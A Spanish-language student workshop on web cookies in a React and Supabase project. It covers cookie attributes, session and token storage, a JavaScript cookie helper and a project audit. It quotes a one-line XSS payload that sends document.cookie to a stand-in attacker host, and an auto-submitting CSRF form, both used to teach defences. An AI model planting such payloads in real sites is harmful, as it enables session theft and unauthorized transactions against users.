# Taller: Cookies en aplicaciones web (React + Supabase)

## Parte 1 — Investigación teórica

### 1. Qué es una cookie

Una cookie es un dato pequeño (clave=valor) que el servidor le pide al navegador que guarde y que este reenvía en cada petición posterior al mismo sitio.

| | Cookie | localStorage | sessionStorage |
|---|---|---|---|
| ¿Se envía automáticamente al servidor? | Sí, en cada petición que coincida con dominio/path | No | No |
| ¿Sobrevive a cerrar el navegador? | Solo si tiene `Expires`/`Max-Age` | Sí | No (muere al cerrar la pestaña) |
| ¿Expiración configurable? | Sí | No (hasta que se borre) | No |
| Tamaño máximo aproximado | ~4 KB por cookie | ~5 MB | ~5 MB |
| ¿Accesible desde JavaScript? | Sí, salvo que sea `HttpOnly` | Sí | Sí |

**HTTP sin estado:** cada petición es independiente; el servidor no recuerda quién eres entre una y otra. Las cookies permiten adjuntar a cada petición un identificador para que el servidor "recuerde" al usuario (sesión, preferencias, carrito).

### 2. Cómo se crea una cookie

- El servidor responde con el encabezado `Set-Cookie`; el navegador la reenvía con el encabezado `Cookie`.
- Desde JS: `document.cookie = "nombre=valor; path=/"`. Es incómoda porque la lectura devuelve una sola cadena con todas las cookies mezcladas (hay que parsearla), no se pueden leer atributos, y para borrar o modificar hay que repetir los atributos.
- Una cookie del servidor puede ser `HttpOnly` (invisible para JS); una creada con JS nunca puede serlo, por lo que cualquier script de la página la lee.

### 3. Atributos

- **`Expires` / `Max-Age`**: fecha absoluta / segundos de vida. Sin ninguno es una **cookie de sesión**, que se borra al cerrar el navegador. Ej.: `Set-Cookie: id=abc; Max-Age=3600`.
- **`Domain` / `Path`**: a qué dominio y rutas se envía. Sin `Domain`, solo el host exacto que la creó; con `Domain=ejemplo.com` también viaja a sus subdominios. Ej.: `Set-Cookie: id=abc; Domain=ejemplo.com; Path=/app`.
- **`Secure`**: solo se envía por HTTPS. En un sitio `http://` el navegador la rechaza (salvo `localhost`). Ej.: `Set-Cookie: id=abc; Secure`.
- **`HttpOnly`**: JS no puede leerla; `document.cookie` no la muestra. Clave contra XSS porque un script inyectado no puede robarla. Ej.: `Set-Cookie: id=abc; HttpOnly`.
- **`SameSite`**:
  - `Strict`: nunca viaja en contexto cross-site. Si llegas desde un enlace externo, la primera petición va sin cookie (apareces "deslogueado"). En un `<iframe>` de otro sitio no viaja.
  - `Lax` (por defecto en navegadores modernos): viaja en navegación de nivel superior con método seguro (clic en un enlace externo, GET), pero no en `<iframe>`, `fetch` ni formularios POST cross-site.
  - `None`: viaja siempre, incluso en iframes de otros sitios. Exige `Secure`.
  - Ej.: `Set-Cookie: id=abc; SameSite=Lax; Secure`.
- **`Partitioned` (CHIPS)**: guarda la cookie de terceros separada por el sitio superior, de modo que un widget embebido (chat, mapa) mantiene estado sin poder rastrear al usuario entre sitios distintos. Ej.: `Set-Cookie: id=abc; Secure; SameSite=None; Partitioned`.

### 4. Primera parte vs. terceros

- **Primera parte**: la crea el dominio que el usuario visita. **Terceros**: la crea otro dominio distinto (por ejemplo un recurso embebido).
- Safari, Firefox y Chrome las bloquean/restringen porque permiten rastrear al usuario entre sitios sin que lo sepa (privacidad).
- Uso legítimo: un login único (SSO) o un widget de pago/chat embebido que necesita sesión. Rastreo: una red publicitaria que identifica al mismo usuario en muchos sitios para perfilarlo.

### 5. Sesiones y autenticación

- **Sesión de servidor**: el servidor guarda los datos del usuario y entrega al navegador una cookie con solo un ID de sesión; en cada petición busca ese ID.
- **Sesión con cookie vs JWT**: la sesión es *stateful* (el servidor guarda estado); el JWT es un token firmado que lleva los datos (*claims*) y el servidor solo valida la firma.
- Un JWT se guarda en cookie, `localStorage` o memoria.
- En `localStorage`, un XSS lo lee y lo roba; en una cookie `HttpOnly` JS no puede leerlo.
- La cookie, en cambio, se envía sola, así que es vulnerable a **CSRF**; `localStorage` no, porque el navegador no lo adjunta automáticamente (hay que añadir el token por código).
- **Refresh token**: token de larga vida que sirve para obtener nuevos access tokens. Se protege más (cookie `HttpOnly`, rotación) porque su robo da acceso prolongado.

### 6. Ataques clásicos

- **XSS**: si un atacante inyecta `<script>fetch('https://malo.com?c='+document.cookie)</script>`, roba las cookies legibles. Con `HttpOnly`, `document.cookie` no las incluye, así que no puede leerlas.
- **CSRF**, paso a paso: 1) la víctima inicia sesión en `banco.com`; 2) visita `malo.com`; 3) esa página envía un formulario oculto POST a `banco.com/transferir`; 4) el navegador adjunta la cookie de sesión automáticamente; 5) el banco cree que la acción es legítima.
- `SameSite=Lax/Strict` evita que la cookie viaje en peticiones cross-site (POST, iframes), pero no es completa: `Lax` permite GET de navegación, hay subdominios del mismo sitio, y navegadores antiguos no lo soportan. Se complementa con **tokens CSRF**.

### 7. Privacidad / normativa

- El RGPD exige consentimiento previo, libre, informado y específico para cookies no esenciales; en Colombia, la Ley 1581 de 2012 y sus decretos exigen autorización del titular para el tratamiento de datos personales e información sobre su finalidad.
- **Estrictamente necesarias** (sesión, carrito, seguridad): no requieren consentimiento. **Analítica/marketing**: sí.
- Un **gestor de consentimiento** es el banner que permite aceptar, rechazar y configurar por categoría, con la misma facilidad para rechazar que para aceptar y poder retirar el consentimiento después.

### 8. Supabase

- Supabase Auth (`supabase-js`) guarda la sesión en `localStorage` por defecto (clave `sb-<ref>-auth-token`). Para SSR (Next.js, etc.) existe `@supabase/ssr`, que usa cookies.
- En una SPA sin servidor propio no hay quien emita cookies `HttpOnly` (solo un servidor puede hacerlo), por eso se usa `localStorage`.
- Para CORS, Supabase responde con `Access-Control-Allow-Origin`; el origen `https://<usuario>.github.io` debe estar permitido (y configurar las URLs de redirección/Site URL en Auth).

### 9. Herramientas del navegador

- Chrome: pestaña **Application → Storage → Cookies**. Firefox: pestaña **Storage → Cookies** (Almacenamiento).
- Columnas: `Name` (nombre), `Value` (valor), `Domain` (dominio), `Path` (ruta), `Expires / Max-Age` (caducidad o `Session`), `Size` (bytes), `HttpOnly`, `Secure`, `SameSite`, `Partition Key` (si es particionada), `Priority`.
- Para borrar una: seleccionarla en la tabla y pulsar `Supr`/botón "Delete Selected" (o clic derecho → Delete).

---

## Parte 2 — Ejercicios

### Ejercicio A — Inspeccionar cookies reales

> Captura: `./img/ejercicioA.png` (pendiente de tomar en DevTools → Application → Cookies, con las columnas Name, Value, Domain, Path, Expires, Size, HttpOnly, Secure, SameSite).

Anotar tras la captura: cuál cookie es de sesión (`Expires = Session`), cuál tiene fecha fija, cuáles tienen `HttpOnly`, y el resultado de `document.cookie` en consola. En github.com, por ejemplo, `user_session`/`__Host-user_session_same_site` están `HttpOnly` y por tanto **no** aparecen en `document.cookie`.

### Ejercicio B — Crear y leer cookies con JS

```js
document.cookie = "tema=oscuro; path=/; max-age=3600";  // crea la cookie
console.log(document.cookie);                           // "tema=oscuro" (más otras visibles)
document.cookie = "tema=; path=/; max-age=0";           // la borra
console.log(document.cookie);                           // "tema=oscuro" ya no aparece
```

- No existe `document.cookie = ""` que borre todo porque `document.cookie` es un *setter* que procesa una sola cookie por asignación; no es una cadena que se sobrescribe.
- Hay que repetir el mismo `path` (y `domain`) porque la identidad de una cookie es la tupla nombre + dominio + path; con otro path se crearía una cookie distinta en lugar de borrar la original.

### Ejercicio C — Helper de cookies en React

Código: [`src/utils/cookies.js`](../src/utils/cookies.js) y componente [`src/components/SelectorTema.jsx`](../src/components/SelectorTema.jsx).

```js
export function setCookie(nombre, valor, diasExpiracion, opciones = {}) {
  const { path = "/", domain, secure = false, sameSite = "Lax" } = opciones;
  let cookie = `${encodeURIComponent(nombre)}=${encodeURIComponent(valor)}; path=${path}`;
  if (typeof diasExpiracion === "number") {
    cookie += `; max-age=${Math.round(diasExpiracion * 24 * 60 * 60)}`;
    cookie += `; expires=${new Date(Date.now() + diasExpiracion * 864e5).toUTCString()}`;
  }
  if (domain) cookie += `; domain=${domain}`;
  if (secure || sameSite === "None") cookie += "; secure";
  cookie += `; samesite=${sameSite}`;
  document.cookie = cookie;
}

export function getCookie(nombre) {
  const buscado = `${encodeURIComponent(nombre)}=`;
  for (const parte of document.cookie.split("; ")) {
    if (parte.startsWith(buscado)) return decodeURIComponent(parte.slice(buscado.length));
  }
  return null;
}

export function deleteCookie(nombre, opciones = {}) {
  setCookie(nombre, "", -1, opciones);
}
```

> Captura: `./img/ejercicioC.png` (selector de tema funcionando y cookie `tema` visible en DevTools tras recargar) — pendiente de tomar.

### Ejercicio D — CSRF (solo análisis)

HTML hipotético de un sitio malicioso:

```html
<form action="https://sitio-victima.com/api/transferir-dinero" method="POST" id="f">
  <input type="hidden" name="destino" value="cuenta-del-atacante">
  <input type="hidden" name="monto" value="1000">
</form>
<script>document.getElementById("f").submit();</script>
```

- Con `SameSite=Strict`: el ataque **no** funciona, la cookie no se envía en ninguna petición cross-site.
- Con `SameSite=Lax`: **tampoco** funciona para este caso, porque es un POST cross-site (Lax solo envía cookies en navegaciones GET de nivel superior). Seguiría siendo vulnerable si el endpoint aceptara GET para cambiar estado.

### Ejercicio E — Auditoría del proyecto

1. Supabase guarda el token en **Local Storage** (clave `sb-<ref>-auth-token`), no en cookies (verificar en Application → Local Storage / Cookies).
2. Si un atacante inyectara un `<script>` (XSS), podría leer `localStorage` y robar el access y refresh token, tomando la sesión. Sí hay exposición a ese riesgo. Mitigaciones: Content-Security-Policy estricta, sanitizar/escapar entradas (React escapa por defecto; evitar `dangerouslySetInnerHTML`), dependencias auditadas, tokens de vida corta, y migrar a cookies `HttpOnly` con `@supabase/ssr` si hay servidor.

---

## Tabla resumen

| Atributo/concepto | ¿Lo usa tu proyecto? | ¿Dónde lo verificaste? |
|---|---|---|
| `Secure` | Solo en producción (HTTPS en GitHub Pages) | DevTools → Application → Cookies |
| `HttpOnly` | No (cookie de tema creada por JS) | DevTools → columna HttpOnly |
| `SameSite` | Sí, `Lax` en la cookie `tema` | DevTools → columna SameSite |
| Cookies de terceros | No | DevTools → Cookies (solo dominio propio) |
| Banner de consentimiento | No (solo cookie funcional de preferencia) | Revisión del proyecto |
| Token de Supabase: ¿cookie o localStorage? | localStorage | DevTools → Application → Local Storage |
